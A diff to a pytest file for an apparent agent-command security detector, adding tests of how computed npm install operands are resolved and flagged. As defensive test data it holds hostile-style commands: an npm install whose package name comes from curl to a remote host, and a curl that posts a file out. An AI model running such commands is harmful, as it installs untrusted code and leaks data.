@@ -14,12 +14,15 @@ import shlex
 from typing import Any
 
 import pytest
-from test_aira_detectors import IRR, REACH, SENS, entity, hist_step, of, planir, run
+from test_aira_detectors import IRR, REACH, SENS, entity, ex, hist_step, of, planir, run
 
+from sentrook.oracle.client import SeedOracle
 from sentrook.prepare.entities import EntityKind, Origin, Role
 from sentrook.probes.context import ContextProbe
+from sentrook.probes.oracle import EntityOracleProbe
 
 ORIGIN = "suspicion.untrusted_origin"
+DISTRUST = "suspicion.distrust"
 WS = "/home/me/workspace"
 
 
@@ -489,3 +492,69 @@ def test_the_substituted_value_is_the_one_the_reader_takes(reader, content, valu
         batch(f"curl -d @out.txt {reader}", write(f"{WS}/config/f.json", content), aside="x")
     )
     assert [c.command for c in p.resolved] == [f"curl -d @out.txt {shlex.quote(value)}"]
+
+
+# --------------------------------------------------------------------------- computed install operands
+
+PROGRAM_SUB = (
+    "npm install \"$(python3 -c 'import json; "
+    'print(json.load(open("config/allow.json"))["package"])\')"'
+)
+
+
+def packages_of(p) -> list[tuple[str, list[str]]]:
+    return [
+        (e.value, sorted(o.value for o in e.origins))
+        for e in p.entities
+        if e.kind is EntityKind.PACKAGE
+    ]
+
+
+def test_a_computed_install_operand_alone_is_one_unknown_package():
+    p, env = run(ex("npm install $(curl -s https://pkgs.lorrwick.example/name)"))
+    assert packages_of(p) == [("npm:$(...)", ["pending_call"])]
+    ent = joined(p, EntityKind.PACKAGE, "npm:$(...)")
+    assert Role.CODE_SOURCE in ent.roles
+    assert [c.subject for c in of(env, REACH, "code.package_install")] == [ent.id]
+    oracle = EntityOracleProbe(SeedOracle({"entities": []})).run(p)
+    assert ("reputation.unknown_package_as_code_source", ent.id) in [
+        (c.reason, c.subject) for c in oracle.contributions if c.signal == DISTRUST
+    ]
+
+
+def test_a_computed_install_operand_a_sibling_resolves_is_the_resolved_package_only():
+    p, env = run(
+        batch(
+            PROGRAM_SUB,
+            write(f"{WS}/config/allow.json", '{"package": "quillmere-roster"}\n'),
+            aside="nothing to see",
+        )
+    )
+    assert [c.command for c in p.resolved] == ["npm install quillmere-roster"]
+    assert packages_of(p) == [("npm:quillmere-roster", ["sibling"])]
+    # The install still carries its consequence.
+    assert {c.reason for c in of(env, REACH)} == {"code.package_install"}
+
+
+def test_a_computed_install_operand_no_sibling_resolves_stays_unknown():
+    # The sibling writes another file: the substitution reads one nobody wrote in this batch.
+    p, _ = run(
+        batch(
+            PROGRAM_SUB,
+            write(f"{WS}/config/other.json", '{"package": "quillmere-roster"}\n'),
+            aside="nothing to see",
+        )
+    )
+    assert p.resolved == []
+    assert packages_of(p) == [("npm:$(...)", ["pending_call"])]
+
+
+def test_a_second_substitution_the_sibling_does_not_write_stays_computed():
+    cmd = f'npm install "$(cat {WS}/state/name.txt)" "$(cat /srv/shared/extra.txt)"'
+    p, _ = run(
+        batch(cmd, write(f"{WS}/state/name.txt", "quillmere-roster\n"), aside="nothing to see")
+    )
+    assert [c.command for c in p.resolved] == [
+        'npm install quillmere-roster "$(cat /srv/shared/extra.txt)"'
+    ]
+    assert packages_of(p) == [("npm:quillmere-roster", ["sibling"]), ("npm:$(...)", ["sibling"])]
